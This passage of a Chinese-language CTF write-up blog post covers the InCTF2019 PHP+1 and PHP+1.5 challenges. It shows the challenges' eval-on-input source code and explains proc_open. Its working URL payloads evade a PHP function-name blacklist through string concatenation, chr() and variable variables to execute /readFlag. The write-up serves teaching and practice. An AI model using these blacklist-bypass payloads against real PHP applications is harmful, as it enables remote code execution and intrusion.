+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$proc = proc_open(<span class="string">"echo foo"</span>,</span><br><span class="line">  <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"pipe"</span>,<span class="string">"r"</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"pipe"</span>,<span class="string">"w"</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"pipe"</span>,<span class="string">"w"</span>)</span><br><span class="line">  ),</span><br><span class="line">  $pipes);</span><br><span class="line"><span class="keyword">print</span> stream_get_contents( $pipes[<span class="number">1</span>] );</span><br><span class="line"><span class="comment">// 输出为 foo</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里要注意的是第2行的<code>$proc</code>必须存在，下面的这个例子运行就会报错：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">proc_open(<span class="string">"echo foo"</span>,</span><br><span class="line">  <span class="keyword">array</span>(</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"pipe"</span>,<span class="string">"r"</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"pipe"</span>,<span class="string">"w"</span>),</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">"pipe"</span>,<span class="string">"w"</span>)</span><br><span class="line">  ),</span><br><span class="line">  $pipes);</span><br><span class="line"><span class="keyword">print</span> fgets( $pipes[<span class="number">1</span>] );</span><br><span class="line"><span class="comment">// Warning: stream_get_contents(): 3 is not a valid stream resource in t.php on line 9</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在官方文档给的例子下，有人给出的解释是：</p>
+<blockquote>
+<p>It seems you actually have to store the return value in order for your streams to exist. You can’t throw it away. </p>
+</blockquote>
+<p>也就是说为了让流存在，必须要存储返回值，不能把这个返回值丢掉。</p>
+<p>所以直接将这个返回值赋给一个变量就可以了，这里的payload是赋给了<code>$ret</code>变量，然后用<code>fgets</code>输出内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;$desc&#x3D;array(array(&#39;p&#39;.&#39;ipe&#39;,&#39;r&#39;),array(&#39;p&#39;.&#39;ipe&#39;,&#39;w&#39;),array(&#39;p&#39;.&#39;ipe&#39;,&#39;w&#39;));$pxpes&#x3D;array();eval(&#39;$ret&#x3D;proc&#39;.$thisfille[8].&#39;open(&quot;&#x2F;readFlag&quot;,$desc,$pxpes);&#39;);eval(&#39;print(fge&#39;.&#39;ts($pxpes[1]));&#39;);&amp;thisfile&#x3D;&#x2F;lib&#x2F;x86_64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<p>成功获得flag：</p>
+<p><img src="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/imgs/7.png" alt="7"></p>
+<p>但是读取<code>/flag</code>却是没有回显的，猜测还是和权限有关，可以这样验证一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;$desc&#x3D;array(array(&#39;p&#39;.&#39;ipe&#39;,&#39;r&#39;),array(&#39;p&#39;.&#39;ipe&#39;,&#39;w&#39;),array(&#39;p&#39;.&#39;ipe&#39;,&#39;w&#39;));$pxpes&#x3D;array();eval(&#39;$ret&#x3D;proc&#39;.$thisfille[8].&#39;open(&quot;ls%20-al%20&#x2F;readFlag&quot;,$desc,$pxpes);&#39;);eval(&#39;print(fge&#39;.&#39;ts($pxpes[1]));&#39;);&amp;thisfile&#x3D;&#x2F;lib&#x2F;x86_64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<p>得到的结果是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r-s--x--x 1 root root 8608 May  6 07:52 &#x2F;readFlag</span><br></pre></td></tr></table></figure>
+
+<p>而<code>ls -al /flag</code>可以发现，只有root用户才可以执行该文件，所以才会什么都没有返回：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-r-------- 1 root root 8608 May  6 08:43 &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="PHP-1-5"><a href="#PHP-1-5" class="headerlink" title="PHP+1.5"></a>PHP+1.5</h2><p>然后看一下PHP+1的升级版，PHP+1.5</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// php+1.5</span></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $input;</span><br><span class="line">    <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/$blacklist/i"</span>, $input)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Do you really you need that?"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unset</span>($blacklist);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille = $_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (is_file($thisfille)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($thisfille)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (check()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">eval</span>($input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($ass <span class="keyword">as</span> $hole) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>和前面一道的差别就是多了对<code>$input</code>的<code>$blacklist</code>检查，也就是说禁掉了<code>eval</code>函数：</p>
+<p><img src="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/imgs/8.png" alt="8"></p>
+<p>所以上面这道题使用eval的解法已经不再适用了，但是php支持另一种字符串看起来比较奇怪的拼接方式：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = p.h.p.i.n.f.o;</span><br><span class="line"><span class="keyword">print</span> $a();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/imgs/9.png" alt="9"></p>
+<p>可以看到，虽然有报错，但是还是执行了<code>phpinfo()</code>命令。</p>
+<p>我们尝试一下读取phpinfo：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;$a&#x3D;p.h.p.i.n.f.o;$a();&amp;thisfile&#x3D;&#x2F;var</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/05/09/InCTF2019-PHP1-0-PHP1-5/imgs/10.png" alt="10"></p>
+<p>payload1：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;</span><br><span class="line">$x&#x3D;ch.r;</span><br><span class="line">$y&#x3D;$x(95);</span><br><span class="line">$z&#x3D;$x(47);</span><br><span class="line">$a&#x3D;p.r.o.c.$y.o.p.e.n;</span><br><span class="line">$b&#x3D;$z.readFlag;</span><br><span class="line">$c&#x3D;p.i.p.es;</span><br><span class="line">$d&#x3D;p.i.p.e;</span><br><span class="line">$e&#x3D;r;</span><br><span class="line">$f&#x3D;w;</span><br><span class="line">$i&#x3D;ne.xt;</span><br><span class="line">$h&#x3D;str.eam.$y.ge.t.$y.con.tents;</span><br><span class="line">$k&#x3D;$a($b,array(array($d,$e),array($d,$f),array($d,$f)),$$c);</span><br><span class="line">print($h($i($$c)));</span><br><span class="line">&amp;thisfile&#x3D;&#x2F;var</span><br></pre></td></tr></table></figure>
+
+<p>稍微解释一下这个payload。$x是<code>chr</code>函数，$y是字符<code>_</code>，$z是字符<code>/</code>，用来拼接<code>/readFlag</code>用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$k=$a($b,<span class="keyword">array</span>(<span class="keyword">array</span>($d,$e),<span class="keyword">array</span>($d,$f),<span class="keyword">array</span>($d,$f)),$$c);</span><br><span class="line"><span class="comment">// equivalent to</span></span><br><span class="line">$k=proc_open(<span class="string">'/readFlag'</span>,<span class="keyword">array</span>(<span class="keyword">array</span>(<span class="string">'pipe'</span>,<span class="string">'r'</span>),<span class="keyword">array</span>(<span class="string">'pipe'</span>,<span class="string">'w'</span>),<span class="keyword">array</span>(<span class="string">'pipe'</span>,<span class="string">'w'</span>)),$pipes);</span><br></pre></td></tr></table></figure>
+
+<p>这里需要特别注意的是传入的是<code>$$c</code>，因为需要将<code>$pipes</code>变成一个变量，<code>$c</code>表示的仅仅是<code>pipes</code>，而不是<code>$pipes</code>。同样的，后面是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span>($h($i($$c)));</span><br><span class="line"><span class="comment">// equivalent to</span></span><br><span class="line"><span class="keyword">print</span>($stream_get_contents(next($pipes)));</span><br></pre></td></tr></table></figure>
+
+<p>另一个payload2，只是在提取<code>$pipes[1]</code>的时候有点区别：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">?input&#x3D;</span><br><span class="line">$x&#x3D;ch.r;</span><br><span class="line">$y&#x3D;$x(95);</span><br><span class="line">$z&#x3D;$x(47);</span><br><span class="line">$a&#x3D;p.r.o.c.$y.o.p.e.n;</span><br><span class="line">$b&#x3D;$z.readFlag;</span><br><span class="line">$c&#x3D;p.i.p.es;</span><br><span class="line">$d&#x3D;p.i.p.e;</span><br><span class="line">$e&#x3D;r;</span><br><span class="line">$f&#x3D;w;</span><br><span class="line">$i&#x3D;(arra).(y).$y.sh.ift;</span><br><span class="line">$j&#x3D;(arr).(ay).$y.sl.ice;</span><br><span class="line">$h&#x3D;str.eam.$y.ge.t.$y.con.tents;</span><br><span class="line">$k&#x3D;$a($b,array(array($d,$e),array($d,$f),array($d,$f)),$$c);</span><br><span class="line">print($h($i($j($$c,1,2))));</span><br><span class="line">&amp;thisfile&#x3D;&#x2F;var</span><br></pre></td></tr></table></figure>
+
+<p>这道题后面还有PHP2.0和PHP2.5，但是最近时间不是很充裕，就先不看了，留着以后回顾的时候当作练习好了。</p>
+<h3 id="PHP-2-5"><a href="#PHP-2-5" class="headerlink" title="PHP+2.5"></a>PHP+2.5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php2.5</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $input;</span><br><span class="line">  <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">      <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/$blacklist/i"</span>, $input))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Do you really you need that?"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unset</span>($blacklist);</span><br><span class="line">  <span class="keyword">if</span>(strlen($input)&gt;<span class="number">100</span>)&#123;  <span class="comment">#That is random no. I took ;)</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This is getting really large input..."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;  </span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille=$_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_file($thisfille))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(file_exists($thisfille))&#123;</span><br><span class="line">    <span class="keyword">if</span>(check())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>($input);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($ass <span class="keyword">as</span> $hole)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="PHP2-0"><a href="#PHP2-0" class="headerlink" title="PHP2.0"></a>PHP2.0</h3><p>这道题的源码同PHP2.5，但是php环境为7.1，而且<code>proc_open</code>函数被禁用了。具体的解法可以参考： <a href="https://blog.bi0s.in/2019/10/16/Web/inctfi19-web-writeups/" target="_blank" rel="noopener">https://blog.bi0s.in/2019/10/16/Web/inctfi19-web-writeups/</a> 和 <a href="https://zhzhdoai.github.io/2019/09/24/Inctf-web题解/" target="_blank" rel="noopener">https://zhzhdoai.github.io/2019/09/24/Inctf-web%E9%A2%98%E8%A7%A3/</a> 。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>Bantian</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="https://bantttian.github.io/2020/05/09/InCTF2019-PHP1-0-PHP1-5/">https://bantttian.github.io/2020/05/09/InCTF2019-PHP1-0-PHP1-5/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+                     <p class="copyright-item">
+                         <span>Slogan:</span>
+                         <span>早睡早起身体好</span>
+                     </p>
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/05/10/Windows10%E4%B8%8B%E7%BC%96%E8%AF%91php%E6%BA%90%E7%A0%81%E5%B9%B6%E9%85%8D%E7%BD%AE%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83/">Windows10下编译php源码并配置调试环境</a>
+            
+            
+            <a class="next" rel="next" href="/2020/04/26/InCTF-2018-BabyPHP/">InCTF2018-BabyPHP</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
